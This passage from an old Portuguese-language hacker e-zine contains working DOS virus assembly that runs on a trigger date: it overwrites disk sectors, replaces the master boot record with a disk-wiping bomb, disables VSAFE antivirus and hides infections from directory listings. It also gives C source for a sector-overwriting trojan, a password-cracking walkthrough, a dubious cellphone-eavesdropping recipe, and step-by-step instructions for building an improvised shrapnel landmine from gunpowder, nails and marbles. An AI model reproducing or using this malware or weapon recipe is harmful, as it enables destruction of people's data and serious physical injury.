+JE  cont                         ;nop! fuck ret          
+cmp byte ptr cs:[action_dia+bp],32  ;
+jne no_day                       ;
+cont:                            ; 
+cmp dh,byte ptr cs:[action_mes+bp]  ;is equal to my month?            
+je set                           ;
+cmp byte ptr cs:[action_mes+bp],13  ;
+jne NO_DAY                       ;nop! fuck ret           
+set:                             ; 
+mov ah,0dh                       ;     
+int 21h                          ;reset disk 
+mov al,2                         ;
+mov cx,0ffffh                    ;
+mov dx,0                         ;  
+int 26h                          ;fuck ffffh sector 
+mov ah,0dh                       ;reste disk  
+int 21h                          ;   
+mov al,2                         ;    
+mov cx,0ffffh                    ;    
+mov dx,0ffffh                    ;new fuck+ 
+int 26h                          ;heheheh!!! 
+NO_DAY:                          ;             
+ret                              ;
+;---------------------------------
+ÿMBR:
+;**************************************
+;    Start of MBR-BOMB writing
+;**************************************
+mov ax,9f80h                ;very high memory                   
+mov es,ax                   ;good for buffer                
+mov ax,0201h                ;read the original         
+mov cx,0001h                ;MBR of the disk           
+mov dx,0080h                ;              
+xor bx,bx                   ;to buffer 9f80:0000h                       
+int 13h                     ;           
+push cs                     ; 
+pop ds                      ; 
+mov ax,9f80h                ;add my MBR-BOMB                                    
+mov es,ax                   ;to real MBR in my       
+mov si,offset fat           ;buffer              
+xor di,di                   ;                   
+mov cx,105                  ;ds:[fat]=>9f80:0000h
+repe movsb                  ;total 105bytes                   
+mov ax,9f80h                ;   
+mov es,ax                   ;   
+xor bx,bx                   ;replace the original    
+mov ax,0301h                ;MBR in the disk by the
+xor ch,ch                   ;new MBR-BOMB.  
+mov dx,0080h                ;
+mov cl,1                    ;WARNING! VSAFE/MSAVE 
+mov bx,0                    ;NOTIFY THIS ACTION 
+int 13h                     ; 
+ret                         ;
+;---------------------------------------------------
+;*********************      
+; Start of MBR code          
+;*********************        
+fat:                              ;       
+cli                               ;#       
+xor     ax,ax                     ;#     
+mov     ss,ax                     ;#       
+mov     sp,7C00h                  ;#        
+mov     si,sp                     ;#        
+push    ax                        ;#    
+pop     es                        ;# 
+push    ax                        ;# 
+pop     ds                        ;#     
+sti                               ;#
+                                  ;#   
+pushf                             ;#   
+push ax                           ;# 
+push cx                           ;# = This code be in the
+push dx                           ;#   original MBR
+push ds                           ;#   (NOT MODIFY)
+push es                           ;#   
+MOV AH,04H                        ; Read real tyme                       
+INT 1AH                           ; Clock          
+CMP DH,cs:byte ptr action_mes     ; is Month?     
+JE CAGO                           ; yes! SNIF SNIF HD. 
+lit:
+pop es
+pop ds
+pop dx  
+pop cx
+pop ax
+popf
+jmp booti
+CAGO:
+;++++++++++++++++++++++++++++++++++++++++++++++++++++
+; START OF YOUR DESTRUCTIVE CODE (or not destructive)
+;++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+rip_hd:                            
+                              ;@                                  
+                xor dx, dx    ;@                
+rip_hd1:                      ;@
+		mov cx, 2     ;@                 
+		mov ax, 311h  ;@    
+		mov dl, 80h   ;@             
+		mov bx, 5000h ;@       
+		mov es, bx    ;@ 
+		int 13h       ;@          
+		jae rip_hd2   ;@         
+		xor ah, ah    ;@       
+		int 13h       ;@       
+		rip_hd2:      ;@        
+		inc dh        ;@        
+		cmp dh, 4     ;@                
+		jb rip_hd1    ;@ 
+		inc ch        ;@        
+		jmp rip_hd            
+
+;+++++++++++++++++++++++++++++++++++++++++++
+;       END OF YOUR DESTRUCUTIVE  CODE
+;+++++++++++++++++++++++++++++++++++++++++++
+booti:
+xor ax,ax     ;#         
+mov es,ax     ;#       
+mov bx,7c00h  ;#             
+mov ah,02     ;#          
+mov al,1      ;#         
+mov cl,1      ;# #= This code be       
+mov ch,0      ;#    in the original        
+mov dh,1      ;#    MBR    
+mov dl,80h    ;#    (NOT MODIFY)   
+              ;#             
+int 13h       ;#                
+              ;#          
+db 0eah,00,7ch,00,00 ;#    
+;*******************
+; END OF MBR CODE
+;*******************
+
+ÿ;---------------------------------
+TRASH_RN:                        ; 
+MOV AH,2DH                       ;        
+INT 21H                          ;get date           
+CMP Dl,6                         ;is =6 (RAN 0-99)                 
+jne NO_DAYY                      ;nop! fuck ret           
+mov ah,0dh                       ;     
+int 21h                          ;reset disk 
+mov al,2                         ;
+mov cx,0ffffh                    ;
+mov dx,0                         ;  
+int 26h                          ;fuck ffffh sector 
+mov ah,0dh                       ;reste disk  
+int 21h                          ;   
+mov al,2                         ;    
+mov cx,0ffffh                    ;    
+mov dx,0ffffh                    ;new fuck+ 
+int 26h                          ;heheheh!!! 
+NO_DAYY:                         ;             
+ret                              ;
+;---------------------------------
+ÿ;---------------------------------
+ANTI_V:                          ; 
+MOV AX,0FA01H                    ;REMOVE VSAFE FROM MEMORY        
+MOV DX,5945H                     ; 
+INT 21H                          ;           
+ret                              ;
+;---------------------------------
+
+ÿ;*****************************************************
+dir_s:                                                               
+             pushf                                                         
+             push    cs                                                    
+             call    a3                      ;Get file Stats                       
+             test    al,al                   ;Good FCB?                            
+             jnz     no_good                 ;nope                                 
+             push    ax                                                 
+             push    bx                                                    
+             push    es                                                    
+             mov     ah,51h                  ;Is this Undocmented? huh...          
+             int     21h                                                   
+             mov     es,bx                                                 
+             cmp     bx,es:[16h]                                           
+             jnz     not_infected                        
+             mov     bx,dx                                                 
+             mov     al,[bx]                                               
+             push    ax                                                    
+             mov     ah,2fh                   ;Get file DTA                         
+             int     21h                                                   
+             pop     ax                                                    
+             inc     al                                                    
+             jnz     fcb_okay                                              
+             add     bx,7h                                                 
+fcb_okay:    mov     ax,es:[bx+17h]                                   
+             and     ax,1fh                   ;UnMask Seconds Field                 
+             xor     al,byte ptr cs:fechad                                      
+             jnz     not_infected                                            
+             and     byte ptr es:[bx+17h],0e0h                            
+             sub     es:[bx+1dh],OFFSET FIN - OFFSET START  ;Yes minus virus size       
+             sbb     es:[bx+1fh],ax                                        
+not_infected:pop     es                                                    
+             pop     bx                                                    
+             pop     ax                                                    
+no_good:     iret                                                          
+;********************************************************************
+; THIS DIR STEALTH METOD IS EXTRAC FROM NUKEK INFO JOURNAL 4 & N-POX 
+;*********************************************************************
+
+ÿaction_dia Db 020H ;day for the action
+action_mes Db 0dH ;month for the action
+FECHA DW 01eH ;Secon for mark
+FECHAd Db 01eH ;Secon for mark dir st
+fin:
+code ends
+end start
+
+<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+
+
+
+
+                   2- Hacking
+
+Protocolo TCP/IP
+
+ Para hackear um sistema ligado a internet/intranet ou ate mesmo um uma
+ simples rede que utiliza o tcp/ip, nada melhor do que saber lidar a fundo
+ com o protocolo mais usado e mais famoso no mundo inteiro. 
+            
+             TCP/IP 
+
+ TCP/IP e o nome que se da a toda a familia de protocolos utilizados pela Internet.
+ Esta familia de protocolos foi desenvolvida pela DARPA (Defense Advanced
+ Research Project Agency) no DoD (Departamento de Defensa dos Estados Unidos).
+
+ Este conjunto de protocolos foi desenvolvido p/permitir aos computadores
+ compartilharem recursos numa rede.Toda a familia de protocolos inclue um conjunto
+ de padroes que especificam os detalhes de como comunicar computadores, assim
+ como tambem conven‡äes para interconectar redes e rotear o trefego. 
+
+ Mas ao contrario do que acontece na imprensa, o nome completo raramente eh
+ usado.O TCP e o IP sao protocolos individuais que podem ser discutidos de modo
+ isolado, mas eles nao sao os unicos protocolos que compoem essa familia. Pode
+ acontecer de um usuario do TCP/IP nao utilizar o protocolo TCP propriamente
+ dito,mas sim alguns protocolos da familia. A utilizacao do TCP/IP nessa situacao nao
+ deixa de ser apropriada porque o nome se aplica de modo generico ao uso de
+ qualquer protocolo da familia TCP/IP. 
+
+             
+             Pilha 
+
+             ="> 
+           ARP
+                      Address Resolution Protocol
+           ICMP
+                      Internet Control Message Protocol
+           UDP
+                      User Datagram Protocol
+           RIP
+                      Routing Information Protocol
+           HTTP
+                      Hypertext Transfer Protocol
+           NNTP
+                      Network News Transfer Protocol
+           *SMTP
+                      Simple Mail Transfer Protocol
+           SNMP
+                      Simple Network Management Protocol
+           FTP
+                      File Transfer Protocol
+           TFTP
+                      Trivial File Transfer Protocol
+           INETPhone
+                      Telephone Services on Internet
+           IRC
+                      Internet Relay Chat
+           RPC
+                      Remote Procedure Call
+           NFS
+                      Network File System 
+           DNS
+                      Domain Name System
+
+ Talvez seja dificil lembrar todos esses acronimos, ate porque alguns tambem sao
+ utilizados por outros protocolos (por exemplo o protocolo RIP da familia Novell, ou o
+ IPX, eh diferente do RIP da familia TCP/IP). Alem do mais, saber exatamente quais
+ sao os protocolos que compoem uma determinada familia nao eh pre-requisito
+ para compreender o funcionamento basico da rede. 
+
+             
+             Uma visao resumida do Protocolo 
+
+ Alguma transferencia se inicia com um pedido de leitura ou escrita de um arquivo, o
+ qual tambem serve para pedir uma conexao. Se o servidor reconhece o pedido, a
+ conexao eh aberta e o arquivo eh enviado num bloco de tamanho fixo de 512 bytes. 
+ Cada pacote de dados contem um bloco de dados e deve ser reconhecido por um
+ pacote de acknowledgment antes que o proximo pacote possa ser enviado. Um
+ pacote de dados menor que 512 bytes sinaliza a terminacao de uma transferencia. 
+ Se um pacote consegue se perder na rede, o receptor indicara time-out e podera
+ retransmitir seu ultimo pacote (o qual pode ser dados ou um reconhecimento ). Isto
+ motiva ao transmissor do pacote perdido a retransmitir o pacote perdido. O
+ transmissor tem que guardar apenas um pacote para retransmissao,desde cada
+ passo de reconhecimento garante que todos os pacotes mais anteriores tenham
+ sido recebidos. 
+ Notar que as duas maquinas envolvidas na transferencia sao consideradas
+ transmissoras e receptoras. Uma envia dados e recebe reconhecimento, a outra
+ envia reconhecimento e recebe dados. 
+ Muitos erros sao causados pela terminacao da conexao.Um erro e sinalizado
+ enviando um pacote de erro. Este pacote nao e reconhecido nem retransmitido (i.e.,
+ um servidor TFTP ou usuario pode terminar depois enviando uma mensagem de
+ erro) assim o outro terminal da conexao nao deve recebe-lo. Portanto os time-out
+ sao usados para detectar tais terminais quando o pacote de erro foi perdido. 
+
+             
+             Protocolo IP 
+
+ O protocolo IP define mecanismos de expedicao de pacotes sem conexao. IP define
+ tres pontos importantes: 
+
+ 1.A unidade basica de dados a ser transferida na Internet.
+ 2.O software de IP executa a funcao de roteamento, escolhendo um caminho
+ sobre o qual os dados serao enviados.  
+ 3.Incluir um conjunto de regras que envolvem a ideia da expedicao de pacotes
+ nao confiaveis. Estas regras indicam como os hosts ou gateways poderiam
+ processar os pacotes; como e quando as mensagens de erros poderiam ser
+ geradas; e as condicoes em que os pacotes podem ser descartados.  
+
+            Dentro do protocolo IP tem os seguintes topicos: 
+
+             
+
+ Endereços IP  
+ Formato do datagrama IP  
+ Roteamento do datagrama IP  
+ ICMP (Internet Control Message Protocol)  
+
+             TCP (Transport Control Protocol) 
+
+ TCP e um protocolo da camada de transporte. Este e um protocolo orientado a
+ conexao, o que indica que neste nivel vao ser solucionados todos os problemas de
+ erros que nao forem solucionados no nivel IP, dado que este ultimo e um protocolo
+ sem conexao. Alguns dos problemas com os q TCP deve tratar são: 
+
+ pacotes perdidos ou destruidos por erros de transmissao. expedicao de pacotes
+ fora de ordem ou duplicados. 
+ O TCP especifica o formato dos pacotes de dados e de reconhecimentos que dois
+ computadores trocam para realizar uma transferˆncia confiavel, assim como os
+ procedimentos que os computadores usam para assegurar que os dados cheguem
+ corretamente. Entre estes procedimentos estao: 
+
+ Distinguir entre multiplos destinos numa maquina determinada. 
+ Fazer recuperacao de erros, tais como pacotes perdidos ou duplicados. 
+
+ Para entender melhor o protocolo TCP a seguir veremos alguns conceitos, para
+ depois passarmos ao formato TCP. 
+
+ Portas, Conexoes e Endpoints 
+ Segmentos, fluxo e Numero de Sequencia 
+ Formato do Segmento TCP 
+
+ DNS (Domain Name System) O DNS (Domain Name System) e um esquema de
+ gerenciamento de nomes, hierarquico e distribuido. O DNS define a sintaxe dos
+ nome s usados na Internet, regras para delegacao de autoridade na definicao de
+ nomes, um banco de dados distribuido que associa nomes a atributos (entre eles o
+ endereco IP) e um algoritmo distribuido para mapear nomes em enderecos. O DNS
+ e especificado nas RFCs 882, 883 e 973. 
+
+ As aplicacoes normalmente utilizam um endereco IP de 32 bits no sentido de abrir
+ uma conexao ou enviar um datagrama IP. Entretanto, os usuarios preferem identificar
+ as maquinas atraves de nomes ao inves de numeros. Assim e necessario um banco
+ de dados que permita a uma aplicacao encontrar um endereco, dado que ela
+ conhece o nome da maquina com a qual se deseja comunicar. 
+
+ Um conjunto de servidores de nomes mantem o banco de dados com os nomes e
+ enderecos das maquinas conectadas a Internet. Na realidade este e apenas um tipo
+ de informacao armazenada no domain system (sistema de dominios).Note que e
+ usado um conjunto de servidores interconectados, ao inves de um unico servidor
+ centralizado. Existem atualmente tantas instituicoes conectadas a Internet que seria
+ impraticavel exigir q elas notificassem uma autoridade central toda vez que uma
+ maquina fosse instalada ou trocasse de lugar. Assim, a autoridade para atribuicao
+ de nomes e delegada a instituicoes individuais.Os servidores de nome formam uma
+ arvor, correspondendo a estrutura institucional. Os nomes tambem adotam uma
+ estrutura similar. 
+
+ Um exemplo tipico e o nome chupeta.jxh.xyz.br. Para encontrar seu endereco
+ Internet, pode ser necessario o acesso a ate quatro servidores de
+ nomes.Inicialmente deve ser consultado um servidor central,denominado servidor
+ raiz, para descobrir onde esta o servidor br. O servidor br e o responsavel pela
+ gerencia dos nomes das instituicoes/empresasbrasileiras ligadas a Internet. O
+ servidor raiz informa como resultado da consulta o endereco IP de varios servidores
+ de nome para o nivel br (pode existir mais de um servidor de nomes em cada nivel,
+ para garantir a continuidade da operacao quando um deles para de funcionar). Um
+ servidor do nivel br pode entao ser consultado, devolvendo o endereco IPdo servidor
+  xyz. 
+
+ De posse do endereco de um servidor xyz e possivel solicitar que ele informe o
+ endereco de um servidor jxh, quando, finalmente, pode-se consultar o servidor jxh
+ sobre o endereco da maquina chupeta.O resultado final da busca e o endereco
+ Internet correspondente ao nome chupeta.jxh.xyz.br 
+ Cada um dos niveis percorridos e referenciado como sendo um dominio. O nome
+ completo chupeta.jxh.xyz.br e um nome de dominio. 
+
+ Na maioria dos casos, nao e necessario ter acesso a todos os dominios de um
+ nome para encontrar o endereco correspondente, pois os servidores de nome
+ muitas vezes possuem informacoes sobre mais de um nivel de dominio o que
+ elimina uma ou mais consultas.Alem disso,as aplicacoes normalmente tem acesso
+ ao DNS atraves de um processo local (servidor para as aplicacoes e um cliente
+ DNS),que pode ser implementado de modo a guardar os ultimos acessos feitos, e
+ assim resolver a consulta em nivel local. Essa abordagem de acesso atraves de um
+ processo local, simplifica e otimiza a tarefa das aplicacoes no que tange ao
+ mapeamento de nomes em enderecos, uma vez que elimina a necessidade de
+ implementar, em todas as aplicacoes que fazen uso do DNS, o algoritmo de
+ caminhamento na arvore de dominios descrito anteriormente. 
+
+ O DNS nao se limita a manter e gerenciar enderecos Internet.Cada nome de
+ dominio e um no em um banco de dados,que pode conter registros definindo varias
+ propriedades. Por exemplo,o tipo da maquina e a lista de servicos fornecidos por
+ ela. O DNS permite que seja definido um alias (nome alternativo) para o no. Tambem
+ e possivel utilizar o DNS para armazenar informacoes sobre usuarios, listas de
+ distribuicao ou outros objetos. 
+
+ O DNS e particularmente importante para o sistema de correio eletronico. No DNS
+ sao definidos registros que identificam a maquina que manipula as
+ correspondencias relativas a um dado nome, identificado assim onde um
+ determinado usuario recebe suas correspondencias. O DNS pode ser usado
+ tambem para definicao de listas para distribuicao de correspondencias 
+
+             
+             SMTP - Simple Mail Transfer Protocol 
+
+ O SMTP (Simple Mail Transfer Protocol) e o protocolo usado no sistema de correio
+ eletronico na arquitetura Internet TCP/IP. Um usuario,ao desejar enviar uma
+ mensagem,utiliza o modulo interface com o usuario para compor a mensagem e
+ solicita ao sistema de correio eletronico que a entregue ao destinatario. Quando
+ recebe a mensagem do usuario, o sistema de correio eletronico armazena uma
+ copia da mensagem em seu spool ( area do dispositivo de armazenamento), junto
+ com o horario do armazenamento e a identificacao do remetente e do destinatario.A
+ transferencia da mensagem e executada por um processo em background,
+ permitindo que o usuario remetente, apos entregar a mensagem ao sistema de
+ correio eletronico, possa executar outras aplicacoes. 
+
+ O processo de transferencia de mensagens,executando em background,mapeia o
+ nome da maquina de destino em seu endereco IP, e tenta estabelecer uma conexao
+ TCP com o servidor de correio eletronico da maquina de destino. Note que o
+ processo de transferencia atua como cliente do servidor do correio eletronico. Se a
+ conexao for estabelecida, o cliente envia uma copia da mensagem para o servidor,
+ que a armazena em seu spool. Caso a mensagem seja transferida com sucesso, o
+ servidor avisa ao cliente que recebeu e armazenou uma copia da
+ mensagem.Quando recebe a confirmacao do recebimento e armazenamento, o
+ cliente retira a copia da mensagem que mantinha em seu spool local. Se a
+ mensagem, por algum motivo, nao for transmitida com sucesso, o cliente anota o
+ horario da tentativa e suspende sua execucao. Periodicamente o cliente acorda e
+ verifica se existem mensagens a serem enviadas na area de spool e tenta
+ transmiti-las. Se uma mensagem nao for enviada por um periodo, por exemplo de
+ dois dias, o servico de correio eletronico devolve a mensagem ao remetente,
+ informando que nao conseguiu transmiti-la. 
+
+ Em geral, quando um usuario se conecta ao sistema, o sistema de correio
+ eletronico e ativado para verificar se existem mensagens na caixa postal do usuario.
+ Se existirem, o sistema de correio eletronico emite um aviso para o usuario que,
+ quando achar conveniente,ativa o modulo de interface com o usuario para receber as
+ correspondencias. 
+
+ Uma mensagem SMTP divide-se em duas partes: cabecalho e corpo, separados
+ por uma linha em branco. No cabecalho sao especificadas as informacoes
+ necessarias para a transferencia da mensagem. O cabecalho e composto por linhas,
+ que contem uma palavra-chave seguida de um valor. Por exemplo, identificacao do
+ remetente (palavra-chave "to:"seguida do seu endereco), identificacao do
+ destinatario, assunto da mensagem, etc... No corpo sao transportadas as
+ informacoes da mensagem propriamente dita. O formato do texto e livre e as
+ mensagens sao transferidas no formato texto. 
+
+ Os usuarios do sistema de correio eletronico sao localizados atraves de um par de
+ identificadores. Um deles especifica o nome da maquina de destino e o outro
+ identificaa caixa postal do usuario. Um remetente pode enviar simultaneamente
+ varias copias de uma mensagem, para diferentes destinatarios utilizando o conceito
+ de lista de distribuicao(um nome que identifica um grupo de usuarios). O formato dos
+ enderecos SMTP e o seguinte: 
+
+            nome_local@nome_do_dominio 
+
+ onde o nome_do_dominio identifica o dominio ao qual a maquina de destino
+ pertence (esse endereco deve identificar um grupo de maquinas gerenciado por um
+ servidor de correio eletronico). O nome local identifica a caixa postal do destinatario. 
+
+ O SMTP especifica como o sistema de correio eletronico transfere mensagens de
+ uma maquina para outra. O modulo interface com usuario e a forma como as
+ mensagens sao armazenadas nao sao definidos pelo SMTP. O sistema de correio
+ eletronico pode tambem ser utilizado por processos de aplicacao para transmitir
+ mensagens contendo textos. 
+
+
+OBs.: Nao vou por nada sobre invasoes.....pq isso esta virando ZONA..todo
+mund0 fica perguntando... ETC....."vcs" sabem do que eu estou falando!!
+
+
+<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+
+                            3- Trojans
+
+ Bom...primeiro vou explicar o q ‚ Trojan Horse ou melhor cavalo de troia.
+ Os trojans sao programas disfarcados, ou seja, ‚ um programa que voce pensa
+ que faz tal coisa, mais na verdade ele faz uma coisa bem diferente e tenta tb
+ fazer com q vc naum perceba o que esta acontecendo!! E.g: Voce faz um programa
+ que diz por exemplo proteger suas pastas contra invasoes em seu computador!!
+ Ai vc todo todo!! entra na iNET dizendo: "- Estou protegido...bla bla bla!!
+ MAS...na verdade, esse programa que diz proteger suas pastas esta mandando
+ por e-mail todos os seus .PWL ( acho q ‚ so 1!! mais sei lah!! eheh) onde
+ estao suas senhas criptografadas....ai vc se f.... bah!!
+ p/ escapar desse tipo de trojan basta nao salvar as senhas no HD!! bah!!
+ simples!! acho q ‚ isso!! tente , invente , hackeie diferente!! hehehe
+ Existem algumas pessoas dizendo tb que BAd Com's e trojans sao a mesma coisa
+ ...na minha opiniao acho q quem disse isso viajo!!! pq BAd CoM's naum sao
+ "programas"disfarcados. Eles na maioria das vezes so formatam o HD e pronto.
+ bah!! Existe tb um negocinho chamado Worm que sao apenas "trojans" mais
+ inteligentes..Eles agem como um virus ele pode ate se multiplicar!! This's
+ k00l!! hehe...a maioria dos Bad Com's sao feitos em Batch, os trojans em C,
+ e os Worm em Assembly!! mas isso naum quer dizer nada!! vc pode fazer um
+ worm em batch tb!! um Bad Com em C e um trojan em..hehe Assembly!!
+ Existem muitos por ai!! ‚ so procurar!! Quem por ventura!! nao achar nenhum
+ trojan!! me manda um E-Mail que eu te arranjo!! um compilado ou um source!!
+ bah!! MAIS PROCURA!!!! Bah!! vo manda um trojan em C !!! so falta compila!!
+
+------------------------------------------------------------------------------
+  Ai vai.......
+  chama-se UGLY
+ ---------------------------\/----------------------------------\/------------
+#include <dos.h>
+#include <string.h>
+
+main()
+{
+	char *vir;
+	int i;
+
+	strcpy(vir,"");
+	for (i=0; i<40; i++)
+	  strcat(vir,"HOWS IT DOING ROYAL UGLY DUDES!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
+	abswrite(2,50,0,vir);
+	abswrite(3,50,0,vir);
+	abswrite(4,50,0,vir);
+	abswrite(5,50,0,vir);
+	printf("Ouch dude... sorry..");
+};
+
+---------------------------------------------\/\/\/\/\/\/\/\/\/\/\/\/\/\------
+
+
+bah!! ai foi!!! ehehe quem nao conseguir compilar!! bah!! sei lah!!
+procura um compilador !!eheheh :)-
+
+
+
+
+<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+
+
+
+                   4- Phreaking ( isso ‚h tesao...ehhehe :/)
+
+  Obviamente ninguem poe tudo que sabe sobre um determinado assunto em um
+  ZINE.... Vou por o basico nos ZINEs.....quem quiser que eu ponha algo mais
+  eu coloco, mais nao informacoes muito avancadas, pq c nao vira "zona"..
+  Vcs viram esse negocio da BLUE BOX... todo mundo sabe que existe ou que
+  da p/ fazer.....entao c vc gosta de hacking...me manda um MAIL...
+  que eu falo mais algumas coisas... c vc gosta de CRACKER tb....
+  e Phreaking idem....hehe( nao vao perguntar coisas obvias nem absurdas
+  c quiserem trocar informacoes tb... MAIL-ME)
+
+
+ Phreaking - escuta atraves de celular
+
+ celular (motorola)
+
+ 1º tire a bateria do celular
+ 2º atras do aparelho tem 3 contatos (os da ponta sao levantados)
+ 3º coloque um papel aluminio no do meio e no da direita
+ 4º recoloque a bateria
+ 5º no visor ira aparecer varios codigos (sao da central)
+ 6º digite 08#, 08#
+ 7º o celular ira fazer um barulho estranho
+ 8º digite X#, onde X é um valor de 1160 até 1260
+ 9º pronto vc já tem uma escuta de celular !!!
+	
+
+ EXPLICACAO: 
+
+ 1- Voce quando coloca o papel aluminio atras do aparelho, voce entra no
+ mode de Programação do celular
+ 2- Os codigos que aparecem, são os codigos de programação do ceu celular e
+ da sua região
+ 3- digitando o 1 (08#) voce desabilita o MUTE do seu celular
+ 4- digitando o 2 (08#) voce entra na area dos cogidos da antena da sua
+ cidade
+ 5- o X do 8 passo, e o numero em que cada celular se encaixa no computador
+ central de celular
+
+by Phanton Phreak
+
+
+<><><><><><><><><><><><>><><><><><><><><><><><><><><><><><><><><><><><><><><><<>><>
+
+
+                              5- IRC
+ O que ‚ IRC!!?? bah!! Internet Relay Chat!! o "vovo" dos chatz!! eheh onde
+ existem pessoas para trocar informacoes!! PhiLez, etc!! onde na maioria das
+ vezes os "hackers" ( eu coloco em "" pq existe muito laMaHz!! la!!) de IRC
+ que trocam seus, nukes, virus, trojans, worM's!! msGs encripitadas!!! etc!!
+
+ Bom!! algumas dicas de IRC que seria o Titulo O Que Fazer no IRC, bla bla bla
+ Para pegar o IP de alguem digite:
+  /dns Nick da Pessoa
+
+  Para mudar de Nick:
+  /nick  seu novo nick!!
+
+Comandos p/ dar uma zuada!!!
+
+       nota: a maioria dos comandos de kikar, banir, mudar o topico, etc!!
+   somente sao usados pelos OP's do canal e os logico os fundadores!!!
+   Mas mudar o topico por exemplo da p/ mudar 100 ser OP. bah!!
+
+
+Kicar um usuario..........: /kick #canal nick msg
+Dar KILL (so p/ IRCops)...: /kill nick msg 
+Banir por nick............: /ban #canal +b 1 
+Banir por IP.............: /ban #canal +b nick 2 
+Banir por host...........: /ban #canal +b nick 3 
+Banir por dominio........: /ban #canal +b nick 4 
+
+Comandos para se defender!
+alguns naum funcionam mais!!!!!
+
+Proteger o IP... tem um programa chamado Spoof!! ou MySpoof !!!       
+Proteger usuario...........: /protect nick 
+Liga/deslida 'protect mode': /protect [on/of] 
+Liga/deslida 'events'......: /events [on/of] 
+Liga/deslida 'remote'......: /remote [on/of] 
+
+Comandos uteis p/ vc!
+
+
+Enviar um arquivo via DCC..: /dcc chat nick 
+Mandar msg a todos os canais: /amsg msg 
+Abrir PVT com uma pessoa....: /query nick 
+Mandar uma mensagem privada.: /msg nick msg 
+Ver quem esta em um canal...: /names #canal 
+Dar um finger...............: /ctcp nick finger 
+Dar um ping.................: /ctcp nick ping 
+
+obtendo informacoes!!
+
+
+Listar os canal do servidor...: /list 
+Ver info dos usuarios.........: /whois nick 
+Informaçoes de um canal logado: /chanel 
+Ver usuarios com mesmo IP.....: /who nick 
+ver info do usuario que saiu..: /whowas nick 
+Ver todos os usuarios online.: /who 
+Verifica usuario que esta na net: /finger email 
+lista usuarios de um nivel..: /ulis nivel 
+Obter info do servidor......: /info 
+Ver os administradores.....: /admi 
+Ver o numero de usuarios...: /lusers 
+Ver quais servidores linkados: /links
+
+Checar 'timers' ligados: /groups -e 
+
+Setando os modos de um canal!
+
+
+Privado....................: /mode #canal +p 
+Secreto....................: /mode #canal +s 
+So os ops mudam o topico...: /mode #canal +t 
+Nao receber msg de fora....: /mode #canal +n 
+Numero limitado de usuarios: /mode #canal +l $num 
+So usuarios 'invitados'....: /mode #canal +i 
+Canal com senha............: /mode #canal +k $senha 
+Canal moderado.............: /mode #canal +m 
+Tirar algum dos modos......: /mode #canal -modo_escolhido 
+
+Setando os modos de um usuario!
+
+
+Invisivel......: /mode nick +i 
+Server msg......: /mode nick +s 
+Wall-ops........: /mode nick +w 
+Voice...........: /mode #canal +v nick
+
+
+
+
+
+<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>                                      
+
+
+
+                          6- Cracking
+
+ BoM...hehe craking ‚ da horinha!!! vou "tentar" ensinar como usar o cracker
+ Jack.... ‚ muito simples!!! primeiro voce tem que pegar as senhas em algum
+ servidor ( a parte mais dificil!! eheh, mas nao impossivel!!!).
+ Ai a senhas vaum estar tudo encriptado, certo?? bah!! entao!! vc vai
+ precisar de uma WordList isso ‚ facil de conseguir!!! mas o problema e q uma
+ boa WordList tem +/- 1GB !!! mais mais uma de uns 20MGz ja ‚ da hora!! hehe
+ ai vc roda o Cracker Jack... vai aparecer o seguinte!!
+
+
+
+  Cracker Jack Version 1.4 for OS/2 and DOS (386).
+  Copyrigth (C)1993, The Jackal, DenMark
+
+
+  PWfile: < aki vc coloca onde esta o arquivo com as senhas>
+
+  Wordfile: < aki vc coloca onde esta a sua WordList>
+
+
+
+
+  Nota: o Meu cracker Jack da uns paUz violento!!!( so chega ate ae!!
+  mais c alguem quiser saber mais!! me manda um Mail!! que eu explico!!
+  Ahh deve ter tb!! uns cracker Jack mais velhos q o meu!! e ate mais
+  novos c pa!! ehe
+
+
+  That's all FolK'z!!
+
+
+
+<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+<><><><><><><><><><><><><><><><><>><><<><><><><><><><>><><><><><><><><><><><><><><><
+
+
+
+                         7- Anarchy!!!
+
+  OoOOoOOo this's danger!! bah!!! p/ quem gosta e m prato cheio!!
+        ou melhor!! um ZiNe cheio!! eheheh ( naum de merda, claro!! ehehhe)
+
+
+
+ Como fazer uma mina caseira
+ ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+   As minas foram muito usadas na II guerra mundial ,
+hoje em dia estao sendo banidas , porem ainda sao mu-
+ito usadas em guerrilhas (como em  Angola).  As minas
+sao dispositivos que ao serem pisados explodem poden-
+do lancar projeteis ou nao. O objetivo  das minas nas
+guerras e guerrilhas  e causar destruicao em veiculos
+ou causar a morte ou grandes ferimentos no inimigo.
+
+Ingredientes:
+   * 1 prego comprido
+   * 1 barra de durepox ou superdurepox
+   * 1 pote de maionese (de vidro)
+   * Algumas bolas de gude
+   * Algumas tachinhas ou pequenos pregos
+   * polvora (+-70% do vol. do pote)
+  
+   Pegue o pote , limpe-o ,ponha uma camada de polvora
+no fundo ,ponha uma camada de pregos ou tachinas,ponha
+outra camada de polvora , ponha uma camada de bolinhas
+de gude , ponha outra camada de polvora. Seja generoso
+com as camadas  de polvora, pois quando voce chegar na
+ultima camada ela deve ter um dedo de largura e chegar
+ate o inicio da rosca  do  pote  , comprima  levemente
+para que a  polvora  se acomode , e se a ultima camada
+depois da  compressao ficar  abaixo do inicio da rosca
+do pote , ponha mais  um pouco de polvora. Entao junte
+os bastoes de durepox (bata cada um deles separadamen-
+te com um martelo para que eles fiquem mais maleaveis)
+faca uma camada de durepox  da altura  do  espaco  que
+falta no pote ,e com outro pote igual corte o durepox.
+Ponha o prego comprido  no pedaco cortado de durepox e
+ponha o pedaco tampando o pote , tome cuidado para que
+nao fique uma camada de ar entre o durepox e a polvora.
+Esta pronta a sua mina! Quando pronta ele deve parecer
+com este desenho:
+
+LEGENDA:
+   
+   o -> bolas de gude
+   = -> Durepox
+   ! -> Prego comprido
+   | -> Paredes do pote
+   / ->    "    "   "
+   \ ->    "    "   "
+   _ ->    "    "   "
+   * -> Tachinhas ou pequenos pregos
+   - -> rosca do pote
+   : -> Polvora
+
+             !
+         -|==!==|-
+         -|==!==|-
+         /:::::::\
+        |ooooooooo|
+        |:::::::::|
+        |*********|
+        |:::::::::|
+        |_________|
+
